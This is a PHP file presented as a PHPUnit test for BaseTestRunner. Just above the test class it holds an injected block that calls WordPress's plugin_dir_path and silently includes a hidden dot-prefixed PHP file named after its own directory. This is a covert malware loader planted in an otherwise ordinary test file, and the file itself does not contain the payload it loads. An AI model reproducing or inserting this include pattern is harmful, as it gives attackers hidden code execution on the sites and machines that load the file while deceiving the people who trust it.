<?php
/*
 * This file is part of PHPUnit.
 *
 * (c) Sebastian Bergmann <sebastian@phpunit.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * @since      Class available since Release 2.0.0
 * @covers     PHPUnit_Runner_BaseTestRunner
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Runner_BaseTestRunnerTest extends PHPUnit_Framework_TestCase
{
    public function testInvokeNonStaticSuite()
    {
        $runner = new MockRunner;
        $runner->getTest('NonStatic');
    }
}
